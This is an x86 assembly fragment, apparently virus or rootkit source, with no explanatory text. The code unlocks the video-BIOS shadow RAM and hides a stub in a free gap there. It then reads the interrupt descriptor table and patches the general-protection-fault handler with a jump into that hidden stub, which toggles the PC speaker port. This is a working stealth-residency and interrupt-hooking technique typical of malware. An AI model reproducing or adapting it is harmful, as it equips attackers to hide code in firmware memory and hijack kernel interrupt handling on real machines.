
ring0_code:             nop
                        nop

                      ; int 3

                        call    find_place_in_shadow

                        pushad
                        call    get_sh_state
                        or      sh_W, seg_C000_32K
                        and     sh_C, not seg_C000_32K
                        call    set_sh_state
                        popad

                        mov     esi, base onstack
                        add     esi, offset shadow
                        mov     edi, shadow_base onstack
                        mov     ecx, shadow_size
                        cld
                        rep     movsb

                        sidt    r0_idtr onstack
                        mov     ebx, r0_idt_base onstack
                        add     ebx, 0Dh*8

                        mov     cx, ebx[6]
                        shl     ecx, 16
                        mov     cx, ebx[0]

                        mov     ax, [ecx]

                        cmp     al, 068h
                        je      patch_1
                        cmp     ax, 0BE60h
                        je      patch_2

                        int 3

patch_2:                inc     ecx

patch_1:                mov     edx, shadow_base onstack

                        mov     al, [ecx]
                        mov     xx_b-shadow[edx], al
                        mov     eax, [ecx+1]
                        mov     xx_d-shadow[edx], eax

                        lea     eax, xx_j-shadow+4[edx]
                        sub     eax, ecx
                        sub     eax, 5
                        neg     eax
                        mov     xx_j-shadow[edx], eax

                        lea     eax, int0D-shadow[edx]
                        sub     eax, ecx
                        sub     eax, 5
                        mov     byte ptr [ecx], 0E9h
                        mov     dword ptr [ecx+1], eax

                        nop
                        nop

                        pushad
                        call    get_sh_state
                        and     sh_W, not seg_C000_32K
                        call    set_sh_state
                        popad

                        nop
                        nop

                        ret

shadow:                 xor     eax, eax

int0D:                  push    ax
                        in      al, 61h
                        xor     al, 3
                        out     61h, al
                        pop     ax

xx_b                    db      ?
xx_d                    dd      ?
                        db      0E9h
xx_j                    dd      ?

shadow_size             equ     $-shadow

include                 sh.inc

find_place_in_shadow:   mov     ecx, 14
                        call    find

                        mov     ecx, 8
                        call    find

                        mov     ecx, 16
                        call    find

                        jmp     $

find:                   imul    ebx, ecx, 255
                        imul    edx, ecx, 'Û'

                        mov     esi, 0C0000h

@@1:                    inc     esi

                        cmp     esi, 0C8000h
                        jae     rt

                        xor     eax, eax
                        mov     edi, esi
                        push    ecx
                        repe    scasb
                        pop     ecx
                        jnz     @@1

                        lea     edi, [esi + ebx]
                        push    ecx
                        repe    scasb
                        pop     ecx
                        jnz     @@1

                        dec     eax
                        lea     edi, [esi + edx]
                        push    ecx
                        repe    scasb
                        pop     ecx
                        jnz     @@1

                        add     esi, 16  ; hehe

                        pop     eax

                        mov     shadow_base onstack, esi

rt:                     ret



